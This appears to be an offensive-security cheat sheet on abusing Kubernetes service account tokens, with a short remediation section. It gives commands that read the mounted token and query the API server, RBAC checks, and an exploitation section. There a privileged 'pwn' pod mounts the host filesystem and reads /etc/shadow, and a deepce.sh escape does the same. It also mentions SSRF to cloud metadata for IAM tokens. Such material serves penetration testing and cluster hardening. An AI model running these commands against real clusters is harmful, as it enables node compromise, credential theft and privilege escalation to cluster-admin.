# Kubernetes Service Account Token Abuse

## Overview

Every Kubernetes pod receives a service account token automatically mounted at:

```
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
```

These tokens authenticate to the Kubernetes API server. If the service account has excessive RBAC permissions, this is a direct path to cluster compromise.

## Enumeration

```sh
# Check token exists and is readable
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Get namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Authenticate to API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces
```

## RBAC Permission Checks

```sh
# Can I create pods? (→ privileged pod escape)
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}' \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews | grep '"allowed"'

# Can I list secrets? (→ read other tokens / DB creds)
# Can I exec in pods? (→ lateral movement)
# Can I escalate ClusterRoles? (→ cluster-admin)
```

## High-Value Permission Impact

| Permission | Impact |
|-----------|--------|
| `create pods` | Privileged pod escape to node (`deepce.sh -e K8S_POD`) |
| `list/get secrets` | Read all secrets including other SA tokens, TLS certs |
| `escalate` on ClusterRole | Bind current SA to cluster-admin |
| `bind` on ClusterRoleBinding | Bind any SA to cluster-admin |
| `exec` on pods | Lateral movement into other pods |
| `impersonate` | Impersonate any user including cluster-admin |

## Token Theft via Other Methods

- **Environment variables**: Some apps expose `KUBE_TOKEN` or `SERVICEACCOUNT_TOKEN`
- **Mounted config files**: kubeconfig files in app dirs
- **SSRF to metadata**: Cloud IAM tokens via 169.254.169.254

## Exploitation

```sh
# deepce privileged pod escape
./deepce.sh -e K8S_POD -cmd "cat /etc/shadow"

# Manual: create privileged pod
kubectl run pwn --image=alpine --overrides='
{
  "spec": {
    "hostPID": true,
    "hostNetwork": true,
    "containers": [{
      "name": "pwn",
      "image": "alpine",
      "securityContext": {"privileged": true},
      "command": ["/bin/sh","-c","chroot /host cat /etc/shadow"],
      "volumeMounts": [{"name":"host","mountPath":"/host"}]
    }],
    "volumes": [{"name":"host","hostPath":{"path":"/"}}]
  }
}'
```

## Remediation

- Use short-lived projected service account tokens (K8s 1.24+)
- Apply least-privilege RBAC — no wildcard permissions
- Disable automounting where not needed: `automountServiceAccountToken: false`
- Enable `BoundServiceAccountTokenVolume` feature gate

## References

- https://bishopfox.com/blog/kubernetes-pod-privilege-escalation
- https://unit42.paloaltonetworks.com/modern-kubernetes-threats/
- https://aquilax.ai/blog/kubernetes-service-account-token-theft
